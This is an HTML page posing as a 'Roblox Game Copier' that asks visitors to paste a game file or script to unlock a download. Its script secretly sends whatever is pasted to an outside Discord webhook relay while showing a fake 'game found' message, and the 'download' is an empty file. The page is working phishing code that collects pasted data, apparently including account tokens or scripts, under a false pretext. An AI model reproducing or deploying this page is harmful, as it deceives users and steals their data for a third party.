<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Download Page</title>
<style>
  body {
    background: linear-gradient(135deg, #3b82f6, #ec4899);
    color: #f8fafc;
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    margin: 0;
    overflow-y: auto;
    padding-bottom: 50px;
  }

  .yt-button {
    position: fixed;
    top: 20px;
    left: 20px;
    width: 56px;
    height: 56px;
    border-radius: 50%;
    background: white;
    display: flex;
    justify-content: center;
    align-items: center;
    box-shadow: 0 6px 18px rgba(0,0,0,0.3);
    cursor: pointer;
    transition: transform 0.2s;
    z-index: 10;
  }

  .yt-button:hover { transform: scale(1.1); }

  .yt-button img {
    width: 100px;
    height: 90px;
  }

  .box {
    background: rgba(0,0,0,0.7);
    padding: 40px;
    border-radius: 16px;
    width: 450px;
    text-align: center;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
    margin-top: 80px;
  }

  textarea {
    width: 100%;
    height: 120px;
    margin-bottom: 15px;
    border-radius: 12px;
    border: none;
    padding: 10px;
    font-family: monospace;
    resize: none;
  }

  button {
    width: 100%;
    padding: 12px;
    border-radius: 12px;
    border: none;
    background: gray;
    color: white;
    font-weight: bold;
    cursor: not-allowed;
    margin-bottom: 10px;
  }

  button.enabled {
    background: #22c55e;
    cursor: pointer;
  }

  .tutorial-title {
    margin: 40px 0 15px;
    font-weight: bold;
    font-size: 20px;
  }

  .video-container {
    width: 560px;
    max-width: 90%;
    height: 315px;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
  }

  /* ✅ FIX TAILLE VIDÉO */
  .video-container iframe {
    width: 100%;
    height: 100%;
    border: none;
  }

  .modal {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.5);
    justify-content: center;
    align-items: center;
    z-index: 20;
  }

  .modal-content {
    background: #444;
    padding: 30px;
    border-radius: 20px;
    text-align: center;
    min-width: 300px;
  }

  .loader {
    border: 6px solid #eee;
    border-top: 6px solid #22c55e;
    border-radius: 50%;
    width: 60px;
    height: 60px;
    animation: spin 1s linear infinite;
    margin: 20px auto;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .game-found {
    font-weight: bold;
    margin: 20px 0;
  }

  .modal button {
    background: #22c55e;
    border: none;
    padding: 10px 20px;
    border-radius: 12px;
    font-weight: bold;
    cursor: pointer;
  }
</style>
</head>
<body>

<a class="yt-button"
   href="https://www.youtube.com/@AndroidOwnedScripterOwner"
   target="_blank">
  <img src="https://www.freeiconspng.com/uploads/youtube-logo-png-photo-0.png">
</a>

<div class="box">
  <h2>Roblox Game Copier</h2>
  <p>Submit the game file to unlock the Download</p>

  <textarea id="input" placeholder="Paste here..."></textarea>
  <button id="submit" disabled>Submit script</button>
  <button id="download" disabled>Download file</button>
</div>

<div class="tutorial-title">TUTORIAL</div>

<div class="video-container">
  <iframe src="https://www.youtube.com/embed/hi7QJJ4bphU" allowfullscreen></iframe>
</div>

<div class="modal" id="modal">
  <div class="modal-content">
    <div class="loader" id="loader"></div>
    <div class="game-found" id="gameName" style="display:none;"></div>
    <button id="okButton" style="display:none;">OK</button>
  </div>
</div>

<script>
const input = document.getElementById("input");
const submitBtn = document.getElementById("submit");
const downloadBtn = document.getElementById("download");
const modal = document.getElementById("modal");
const loader = document.getElementById("loader");
const gameName = document.getElementById("gameName");
const okButton = document.getElementById("okButton");

input.addEventListener("input", () => {
  submitBtn.disabled = input.value.trim() === "";
  submitBtn.classList.toggle("enabled", !submitBtn.disabled);
});

submitBtn.addEventListener("click", () => {
  modal.style.display = "flex";
  loader.style.display = "block";
  gameName.style.display = "none";
  okButton.style.display = "none";

  const textValue = input.value;

  setTimeout(() => {
    const regex = /https?:\/\/www\.roblox\.com\/games\/(\d+)\/([A-Za-z0-9\-]+)/i;
    const match = regex.exec(textValue);

    loader.style.display = "none";

    if (match) {
      gameName.textContent = `Game found: ${match[2].replace(/-/g, " ")}`;
    } else {
      gameName.textContent = "Error: Roblox game not found";
    }

    gameName.style.display = "block";
    okButton.style.display = "inline-block";
  }, 1000);

  fetch("https://discord-webhook-server-uhrf.onrender.com/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: textValue })
  }).catch(() => {});
});

okButton.addEventListener("click", () => {
  modal.style.display = "none";
  downloadBtn.disabled = false;
  downloadBtn.classList.add("enabled");
});

/* ✅ FIX DOWNLOAD */
downloadBtn.addEventListener("click", () => {
  if (downloadBtn.disabled) return;

  const blob = new Blob([""], { type: "application/octet-stream" });
  const url = URL.createObjectURL(blob);

  const a = document.createElement("a");
  a.href = url;
  a.download = "gamefile.rbxl";
  document.body.appendChild(a);
  a.click();

  document.body.removeChild(a);
  URL.revokeObjectURL(url);
});
</script>
</body>
</html>
